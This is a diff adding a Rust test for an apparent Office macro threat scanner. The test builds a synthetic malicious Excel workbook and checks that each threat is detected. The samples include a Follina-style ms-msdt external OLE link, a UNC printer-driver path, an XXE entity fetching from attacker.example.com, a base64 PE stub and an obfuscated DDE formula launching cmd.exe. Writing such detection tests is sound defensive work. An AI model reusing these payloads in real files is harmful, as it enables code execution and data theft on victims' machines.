@@ -2743,3 +2743,125 @@ fn e2e_bitwise_xlookup_and_text_threat_deobfuscation() {
         "E1 should resolve DDE via BITXOR decryption: {threats:?}"
     );
 }
+
+#[test]
+fn e2e_package_threats_printer_settings_custom_xml_and_protocols() {
+    let src = "Sub CleanProc()\nEnd Sub\n";
+    let line0 = build_func_defn(0);
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let cfb = synthesize_cfb_project(
+        "PackageThreatProj",
+        &[("ThisWorkbook", src, &pcode)],
+        &["CleanProc"],
+    );
+
+    let content_types = "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">\
+        <Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>\
+        <Default Extension=\"xml\" ContentType=\"application/xml\"/>\
+        <Default Extension=\"bin\" ContentType=\"application/vnd.openxmlformats-officedocument.printer-settings\"/>\
+        <Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.ms-excel.sheet.macroEnabled.main+xml\"/>\
+        <Override PartName=\"/xl/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/>\
+        <Override PartName=\"/xl/worksheets/sheet1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/>\
+    </Types>";
+
+    let pkg_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
+        <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/>\
+        <Relationship Id=\"rIdFollina\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\" Target=\"ms-msdt:/id PCWDiagnostic /skip force /param IT_LaunchMethod=ContextMenu\" TargetMode=\"External\"/>\
+    </Relationships>";
+
+    let wb = "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\">\
+        <sheets><sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId2\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"/></sheets>\
+    </workbook>";
+
+    let wb_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
+        <Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/>\
+        <Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet1.xml\"/>\
+        <Relationship Id=\"rIdPrint\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/printerSettings\" Target=\"printerSettings/printerSettings1.bin\"/>\
+    </Relationships>";
+
+    // Synthesize binary printer settings with UTF-16LE UNC path (DEVMODEW style)
+    let unc_str = "\\\\10.0.0.1\\share\\evil_driver";
+    let mut printer_bin = Vec::new();
+    printer_bin.extend_from_slice(b"DEVMODEW_HEADER_DATA_PADDING");
+    for u in unc_str.encode_utf16() {
+        printer_bin.extend_from_slice(&u.to_le_bytes());
+    }
+    printer_bin.extend_from_slice(&[0u8, 0u8]); // null terminator
+
+    // Synthesize customXml with base64 PE DOS stub and XXE injection
+    let custom_xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
+        <!DOCTYPE doc [ <!ENTITY xxe SYSTEM \"http://attacker.example.com/payload.dtd\"> ]>\
+        <root>\
+            <payload>TVqQAAMAAAAEAAAA//8AAL8AAAAAAAAEQAAAAAAAAA==</payload>\
+        </root>";
+
+    // Sheet with DECIMAL formula deobfuscating DDE
+    let sheet1 = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData>\
+        <row r=\"1\">\
+            <c r=\"A1\"><f>=CHAR(DECIMAL(&quot;63&quot;, 16)) &amp; CHAR(DECIMAL(&quot;6D&quot;, 16)) &amp; CHAR(DECIMAL(&quot;64&quot;, 16)) &amp; &quot;.exe|'/c calc'!A0&quot;</f></c>\
+        </row>\
+    </sheetData></worksheet>";
+
+    let xlsm = synthesize_zip(&[
+        ("[Content_Types].xml", content_types.as_bytes()),
+        ("_rels/.rels", pkg_rels.as_bytes()),
+        ("xl/workbook.xml", wb.as_bytes()),
+        ("xl/_rels/workbook.xml.rels", wb_rels.as_bytes()),
+        ("xl/vbaProject.bin", &cfb),
+        ("xl/worksheets/sheet1.xml", sheet1.as_bytes()),
+        ("xl/printerSettings/printerSettings1.bin", &printer_bin),
+        ("customXml/item1.xml", custom_xml.as_bytes()),
+    ]);
+
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");
+    let threats = &inspection.extracted.cell_threats;
+
+    // 1. Verify SuspiciousPrinterSettings (VBA-CELL-015)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "SuspiciousPrinterSettings"
+                && t.description.contains("UNC path")),
+        "Should detect suspicious printer settings UNC injection: {threats:?}"
+    );
+
+    // 2. Verify CustomXmlPayloadSmuggling (VBA-CELL-016)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "CustomXmlPayloadSmuggling"
+                && (t.description.contains("PE Executable") || t.description.contains("XXE"))),
+        "Should detect custom XML payload smuggling: {threats:?}"
+    );
+
+    // 3. Verify SuspiciousProtocolHandler or ExternalOleObject (VBA-CELL-017 / 012)
+    assert!(
+        threats.iter().any(|t| t.threat_kind == "ExternalOleObject"
+            || t.threat_kind == "SuspiciousProtocolHandler"),
+        "Should detect relationship target threat: {threats:?}"
+    );
+
+    // 4. Verify A1: DDE formula de-obfuscated via DECIMAL
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "A1"
+            && t.threat_kind == "DDE"
+            && t.description.contains("cmd.exe|'/c calc'!A0")),
+        "A1 should resolve DDE via DECIMAL hex decoding: {threats:?}"
+    );
+
+    // 5. Verify SARIF output contains VBA-CELL-015, VBA-CELL-016
+    let sarif = inspection_to_sarif(&inspection, "file:///test/malicious.xlsm");
+    assert!(
+        sarif.contains("VBA-CELL-015"),
+        "SARIF must contain VBA-CELL-015 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-016"),
+        "SARIF must contain VBA-CELL-016 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-017"),
+        "SARIF must contain VBA-CELL-017 rule"
+    );
+}
